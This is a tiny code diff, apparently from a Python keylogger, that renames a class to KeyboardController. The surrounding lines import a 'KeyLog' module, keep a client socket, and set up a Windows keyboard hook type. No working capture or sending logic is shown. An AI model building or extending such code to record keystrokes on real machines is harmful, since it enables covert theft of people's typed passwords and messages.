@@ -3,7 +3,7 @@ from ctypes.wintypes import DWORD, MSG
 import KeyLog
 import threading
 
-class keyboardController():
+class KeyboardController():
     def __init__(self, clientSocket):
         self.__client = clientSocket
         self.HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
